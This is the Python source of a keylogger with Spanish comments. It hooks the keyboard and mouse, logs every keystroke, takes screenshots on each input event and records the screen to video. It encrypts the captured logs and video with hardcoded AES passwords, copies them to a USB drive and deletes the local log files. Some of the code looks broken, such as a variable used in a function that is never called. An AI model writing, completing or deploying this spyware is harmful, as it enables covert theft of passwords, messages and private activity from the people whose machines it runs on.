import pyxhook
import os
import shutil
import hashlib
import zipfile
import pyautogui
import datetime
import time
import cv2
import numpy as np
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import pad, unpad

log_file = 'registro.txt'  # nombre de archivo para guardar el registro
usb_path = 'F:\\'  # ruta del USB donde se almacenará la información
keylogger_size = os.path.getsize(__file__)

def OnKeyPress(event):
    now = datetime.datetime.now()
    with open(log_file, 'a') as f:
        f.write('{} [KEYPRESS]\t{}\t{}\n'.format(now, event.Key, event.Ascii))

    # Capturar imagen de la pantalla con sello de tiempo
    screenshot_path = os.path.join(usb_path, 'screenshots', 'screenshot_{}.png'.format(now.strftime('%Y%m%d_%H%M%S')))
    pyautogui.screenshot(screenshot_path)

def OnMouseMove(event):
    now = datetime.datetime.now()
    with open(log_file, 'a') as f:
        f.write('{} [MOUSEMOVE]\t{}\t{}\n'.format(now, event.Position[0], event.Position[1]))

    # Capturar imagen de la pantalla con sello de tiempo
    screenshot_path = os.path.join(usb_path, 'screenshots', 'screenshot_{}.png'.format(now.strftime('%Y%m%d_%H%M%S')))
    pyautogui.screenshot(screenshot_path)

def generate_key(password, salt=b'salt_'):
    kdf = PBKDF2(password, salt, dkLen=32, count=100000)
    return kdf

def encrypt_file(key, input_file, output_file):
    with open(input_file, 'rb') as f:
        data = f.read()

    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_data = iv + cipher.encrypt(pad(data, AES.block_size))

    with open(output_file, 'wb') as f:
        f.write(encrypted_data)

def record_screenshots():
    screenshots_path = os.path.join(usb_path, 'screenshots')
    os.makedirs(screenshots_path, exist_ok=True)

    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    video_path = os.path.join(usb_path, 'screen_record.mp4')
    video_out = cv2.VideoWriter(video_path, fourcc, 5.0, (1920, 1080))

    while True:
        now = datetime.datetime.now()
        screenshot_file = os.path.join(screenshots_path, 'screenshot_{}.png'.format(now.strftime('%Y%m%d_%H%M%S')))
        pyautogui.screenshot(screenshot_file)
        image = cv2.imread(screenshot_file)
        video_out.write(image)

        time.sleep(5)  # Grabar una captura de pantalla cada 5 segundos

        # Encriptar el archivo de video y guardarlo
        key = generate_key('password_for_video_encryption')
        encrypt_file(key, video_path, video_path + '.encrypted')

        # Mover el archivo cifrado al destino original
        shutil.move(video_path + '.encrypted', video_path)

def copy_log_to_usb():
    while True:
        time.sleep(600)  # Copiar cada 10 minutos (600 segundos)
        shutil.copy(log_file, usb_path)
        shutil.copy(encrypted_log_file, usb_path)

# Configurar el keylogger
hook_manager = pyxhook.HookManager()
hook_manager.KeyDown = OnKeyPress
hook_manager.MouseMovement = OnMouseMove
hook_manager.HookKeyboard()
hook_manager.HookMouse()
hook_manager.start()

# Esperar a que se inserte el USB
while not os.path.exists(usb_path):
    pass

# Verificar espacio en la memoria USB
usb_stats = shutil.disk_usage(usb_path)
if usb_stats.free > keylogger_size:
    # Obtener clave de encriptación
    key = generate_key('password_for_encryption')

    # Encriptar el archivo de registro
    encrypted_log_file = os.path.join(usb_path, 'registro_encrypted.txt')
    encrypt_file(key, log_file, encrypted_log_file)

    # Crear archivo ZIP comprimido con el archivo de registro encriptado y el hash
    with zipfile.ZipFile(os.path.join(usb_path, 'registro_encrypted.zip'), 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(encrypted_log_file)

    # Eliminar archivo de registro local y el archivo encriptado
    os.remove(log_file)
    os.remove(encrypted_log_file)

    # Iniciar el proceso de grabación de capturas de pantalla cada cierto tiempo
    record_screenshots()
else:
    print("Espacio insuficiente en el USB.")
